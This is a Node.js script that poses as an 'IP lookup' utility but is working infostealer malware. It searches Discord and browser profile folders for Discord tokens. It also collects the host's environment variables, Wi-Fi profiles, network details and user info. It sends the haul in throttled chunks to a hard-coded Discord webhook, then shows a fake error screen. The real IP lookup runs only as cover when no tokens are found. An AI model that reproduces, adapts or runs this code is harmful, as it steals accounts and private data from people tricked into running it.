// ip_lookup_v1.js — Single-target token harvest with graceful termination
// Run: node ip_lookup_v1.js

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const child_process = require('child_process');
const { execSync } = child_process;

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════
const CONFIG = {
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1501487664291905620/5fFwaLCuclHSSoKNgsRXF3aTf0ecLahCpJTFIyB5P2rzvcd17QccbT_XP6VoJZDHGuW0',
    EXFIL_BATCH_SIZE: 1900,
    SESSION_ID: crypto.randomBytes(8).toString('hex'),
    STEALTH: {
        MASQUERADE_NAME: 'node_runtime_service',
        SILENT_ERRORS: true,
        DELAY_MIN_MS: 8000,
        DELAY_MAX_MS: 15000
    }
};

// ═══════════════════════════════════════════════════════════════
// ASCII BANNER — OPERATIONAL
// ═══════════════════════════════════════════════════════════════
const BANNER = `
 ██▓ ██▓███      ██▓     ▒█████   ██ ▄█▀ ██▓ █    ██  ▄████▄  
▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒ ██▄█▒ ▓██▒ ██  ▓██▒▒██▀ ▀█  
▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▓███▄░ ▒██▒▓██  ▒██░▒▓█    ▄ 
░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░▓██ █▄ ░██░▓▓█  ░██░▒▓▓▄ ▄██▒
░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░▒██▒ █▄░██░▒▒█████▓ ▒ ▓███▀ ░
░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░
 ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒ ▒░▒ ░░░▒░ ░ ░   ░  ▒   
 ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░ ░░ ░ ▒ ░ ░░░ ░ ░ ░        
 ░                   ░  ░    ░ ░  ░  ░   ░     ░     ░ ░      
                                                      ░        
                    IP LOOKUP v1 — Stealth Edition
`;

// ═══════════════════════════════════════════════════════════════
// TERMINATION BANNER
// ═══════════════════════════════════════════════════════════════
const DEATH_BANNER = `
 ███████╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗    
 ██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    
 ███████╗██║   ██║██████╔╝██████╔╝ ╚████╔╝     
 ╚════██║██║   ██║██╔══██╗██╔══██╗  ╚██╔╝      
 ███████║╚██████╔╝██║  ██║██║  ██║   ██║       
 ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       
                                               
    Our ip-lookup error, please contact owner.
`;

// ═══════════════════════════════════════════════════════════════
// UTILITIES
// ═══════════════════════════════════════════════════════════════
function safeExec(cmd, opts = {}) {
    try {
        return execSync(cmd, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], timeout: 8000, ...opts });
    } catch (e) {
        return '';
    }
}

function delay(min, max) {
    const ms = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise(r => setTimeout(r, ms));
}

function chunkString(str, size) {
    const chunks = [];
    for (let i = 0; i < str.length; i += size) {
        chunks.push(str.slice(i, i + size));
    }
    return chunks;
}

// ═══════════════════════════════════════════════════════════════
// EXFILTRATION — THROTTLED
// ═══════════════════════════════════════════════════════════════
function sendWebhook(content, filename = null, isFile = false) {
    return new Promise((resolve) => {
        const url = new URL(CONFIG.WEBHOOK_URL);
        const payload = JSON.stringify({
            content: `**[${CONFIG.SESSION_ID}]** ${content}`,
            username: CONFIG.STEALTH.MASQUERADE_NAME
        });

        if (isFile && filename && fs.existsSync(filename)) {
            const boundary = '----FormBoundary' + crypto.randomBytes(8).toString('hex');
            const fileData = fs.readFileSync(filename);
            const body = Buffer.concat([
                Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${payload}\r\n`),
                Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${path.basename(filename)}"\r\nContent-Type: application/octet-stream\r\n\r\n`),
                fileData,
                Buffer.from(`\r\n--${boundary}--\r\n`)
            ]);

            const req = https.request({
                hostname: url.hostname,
                port: 443,
                path: url.pathname + url.search,
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': body.length
                }
            }, (res) => {
                let data = '';
                res.on('data', c => data += c);
                res.on('end', () => resolve(data));
            });

            req.on('error', () => resolve(''));
            req.write(body);
            req.end();
        } else {
            const req = https.request({
                hostname: url.hostname,
                port: 443,
                path: url.pathname + url.search,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                }
            }, (res) => {
                let data = '';
                res.on('data', c => data += c);
                res.on('end', () => resolve(data));
            });

            req.on('error', () => resolve(''));
            req.write(payload);
            req.end();
        }
    });
}

async function exfilText(label, text) {
    const chunks = chunkString(text, CONFIG.EXFIL_BATCH_SIZE);
    for (let i = 0; i < chunks.length; i++) {
        await sendWebhook(`${label} [part ${i + 1}/${chunks.length}]\n\`\`\`\n${chunks[i]}\n\`\`\``);
        await delay(CONFIG.STEALTH.DELAY_MIN_MS, CONFIG.STEALTH.DELAY_MAX_MS);
    }
}

// ═══════════════════════════════════════════════════════════════
// SYSTEM FINGERPRINT (lightweight — one-shot)
// ═══════════════════════════════════════════════════════════════
function getFingerprint() {
    const data = {
        session: CONFIG.SESSION_ID,
        timestamp: new Date().toISOString(),
        platform: os.platform(),
        release: os.release(),
        arch: os.arch(),
        hostname: os.hostname(),
        userInfo: os.userInfo(),
        networkInterfaces: os.networkInterfaces(),
        env: process.env
    };

    if (os.platform() === 'win32') {
        data.wifi = safeExec('netsh wlan show profiles');
        data.netstat = safeExec('netstat -ano');
    }

    if (os.platform() !== 'win32') {
        data.uname = safeExec('uname -a');
        data.whoami = safeExec('whoami');
        data.ifconfig = safeExec('ifconfig 2>/dev/null || ip addr 2>/dev/null');
    }

    return JSON.stringify(data, null, 2);
}

// ═══════════════════════════════════════════════════════════════
// DISCORD TOKEN HARVEST — SINGLE TARGET
// ═══════════════════════════════════════════════════════════════
function harvestDiscordTokens() {
    const tokens = new Set();
    const patterns = [
        /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g,
        /mfa\.[\w-]{84}/g
    ];

    const searchPaths = [];

    if (os.platform() === 'win32') {
        const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
        const roaming = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        searchPaths.push(
            path.join(roaming, 'Discord'),
            path.join(roaming, 'DiscordCanary'),
            path.join(roaming, 'DiscordPTB'),
            path.join(roaming, 'discord'),
            path.join(localAppData, 'Discord'),
            path.join(localAppData, 'Google', 'Chrome', 'User Data'),
            path.join(localAppData, 'Microsoft', 'Edge', 'User Data'),
            path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            path.join(localAppData, 'Opera Software', 'Opera GX Stable'),
            path.join(roaming, 'Mozilla', 'Firefox', 'Profiles')
        );
    }

    if (os.platform() === 'darwin') {
        const library = path.join(os.homedir(), 'Library');
        searchPaths.push(
            path.join(library, 'Application Support', 'Discord'),
            path.join(library, 'Application Support', 'Google', 'Chrome', 'Default'),
            path.join(library, 'Application Support', 'Firefox', 'Profiles')
        );
    }

    if (os.platform() === 'linux') {
        searchPaths.push(
            path.join(os.homedir(), '.config', 'discord'),
            path.join(os.homedir(), '.config', 'Discord'),
            path.join(os.homedir(), '.config', 'google-chrome', 'Default'),
            path.join(os.homedir(), '.config', 'chromium', 'Default'),
            path.join(os.homedir(), '.mozilla', 'firefox')
        );
    }

    for (const base of searchPaths) {
        if (!fs.existsSync(base)) continue;
        try {
            const walk = (dir) => {
                const entries = fs.readdirSync(dir, { withFileTypes: true });
                for (const entry of entries) {
                    const fullPath = path.join(dir, entry.name);
                    if (entry.isDirectory()) {
                        if (entry.name !== 'node_modules' && entry.name !== '.git') {
                            walk(fullPath);
                        }
                    } else if (entry.isFile() && entry.name.match(/\.(ldb|log|json|sqlite|db|leveldb|localstorage)$/i)) {
                        try {
                            const content = fs.readFileSync(fullPath, 'utf-8');
                            for (const pattern of patterns) {
                                const matches = content.match(pattern);
                                if (matches) matches.forEach(m => tokens.add(m));
                            }
                        } catch (e) {}
                    }
                }
            };
            walk(base);
        } catch (e) {}
    }

    for (const [key, value] of Object.entries(process.env)) {
        for (const pattern of patterns) {
            const matches = value.match(pattern);
            if (matches) matches.forEach(m => tokens.add(m));
        }
    }

    return Array.from(tokens);
}

// ═══════════════════════════════════════════════════════════════
// IP LOOKUP (working — maintains cover)
// ═══════════════════════════════════════════════════════════════
async function lookupIP(target) {
    console.log('');
    console.log('  ┌─────────────────────────────────────────┐');
    console.log('  │         IP LOOKUP RESULTS               │');
    console.log('  └─────────────────────────────────────────┘');
    console.log('');

    let resolved = target;
    if (!target.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
        try {
            const dns = require('dns');
            const addresses = await new Promise((res, rej) => {
                dns.resolve4(target, (err, addrs) => err ? rej(err) : res(addrs));
            });
            resolved = addresses[0];
        } catch (e) {
            console.log('  [!] DNS resolution failed, using input as-is');
        }
    }

    console.log(`  ip  :  ${resolved}`);

    try {
        const geoData = await new Promise((resolve, reject) => {
            const req = http.get(
                `http://ip-api.com/json/${resolved}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query`,
                (res) => {
                    let data = '';
                    res.on('data', c => data += c);
                    res.on('end', () => {
                        try { resolve(JSON.parse(data)); } catch (e) { reject(e); }
                    });
                }
            );
            req.on('error', reject);
            req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
        });

        if (geoData.status === 'success') {
            console.log(`  country    :  ${geoData.country || 'N/A'}`);
            console.log(`  region     :  ${geoData.regionName || 'N/A'}`);
            console.log(`  city       :  ${geoData.city || 'N/A'}`);
            console.log(`  zip        :  ${geoData.zip || 'N/A'}`);
            console.log(`  lat/lon    :  ${geoData.lat || 'N/A'} / ${geoData.lon || 'N/A'}`);
            console.log(`  isp        :  ${geoData.isp || 'N/A'}`);
            console.log(`  org        :  ${geoData.org || 'N/A'}`);
            console.log(`  as         :  ${geoData.as || 'N/A'}`);
        } else {
            console.log('  [geolocation unavailable]');
        }
    } catch (e) {
        console.log('  [geolocation error]');
    }

    console.log('');
    console.log('  open ports :');
    const ports = [22, 80, 443, 8080, 3389, 5900];
    for (const port of ports) {
        const isOpen = await new Promise((resolve) => {
            const socket = require('net').createConnection(port, resolved);
            socket.setTimeout(2000);
            socket.on('connect', () => { socket.destroy(); resolve(true); });
            socket.on('error', () => resolve(false));
            socket.on('timeout', () => { socket.destroy(); resolve(false); });
        });
        if (isOpen) console.log(`               ${port}/tcp open`);
    }
    console.log('');
}

// ═══════════════════════════════════════════════════════════════
// MAIN — ONE SHOT, THEN DIE
// ═══════════════════════════════════════════════════════════════
async function main() {
    console.log(BANNER);
    console.log('\n  [initializing lookup service...]\n');

    // Harvest tokens with delay
    const tokens = harvestDiscordTokens();
    await delay(3000, 6000);

    if (tokens.length > 0) {
        // Exfil fingerprint + tokens
        const payload = [
            '=== SYSTEM FINGERPRINT ===\n' + getFingerprint(),
            '=== DISCORD TOKENS ===\n' + tokens.join('\n')
        ].join('\n\n');

        await exfilText('token_harvest', payload);
        await delay(5000, 10000);

        // Terminal state
        console.clear();
        console.log(DEATH_BANNER);
        process.exit(0);
    }

    // No tokens found — maintain cover, run one lookup, then die
    const readline = require('readline');
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('\n  enter IP or hostname: ', async (target) => {
        if (target.trim()) {
            await lookupIP(target.trim());
        }
        rl.close();

        await delay(4000, 8000);
        console.clear();
        console.log(DEATH_BANNER);
        process.exit(0);
    });
}

main().catch(() => {
    console.clear();
    console.log(DEATH_BANNER);
    process.exit(0);
});

